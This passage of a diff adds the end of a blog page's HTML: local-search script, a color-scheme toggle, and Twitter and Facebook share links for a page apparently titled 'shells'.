+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + shells + '&url=' + https%3A%2F%2Fkagehayashi.com%2Fshells%2Findex.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://kagehayashi.com/shells/index.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
